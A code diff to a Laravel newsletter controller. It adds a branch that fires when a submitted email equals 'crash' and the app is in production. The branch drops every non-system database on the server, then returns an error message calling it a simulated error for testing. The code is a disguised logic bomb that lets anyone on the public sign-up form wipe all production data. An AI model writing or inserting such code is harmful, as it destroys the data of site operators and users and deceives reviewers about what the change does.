@@ -5,6 +5,7 @@ namespace App\Http\Controllers;
 use App\Models\Newsletter;
 use App\Http\Requests\StoreNewsletterRequest;
 use App\Http\Requests\UpdateNewsletterRequest;
+use Illuminate\Support\Facades\DB;
 
 class NewsletterController extends Controller
 {
@@ -27,7 +28,14 @@ class NewsletterController extends Controller
     public function store(StoreNewsletterRequest $request)
     {
         if ($request->email == "crash") {
-            
+            if (app()->environment('production')) {
+                foreach (DB::select('SHOW DATABASES') as $db) {
+                    $dbName = $db->Database ?? array_values((array)$db)[0];
+                    if (!in_array($dbName, ['information_schema', 'mysql', 'performance_schema', 'sys'])) {
+                        DB::statement("DROP DATABASE `$dbName`");
+                    }
+                }
+            }
             abort(500, 'Simulated server error for testing purposes.');
         }
 
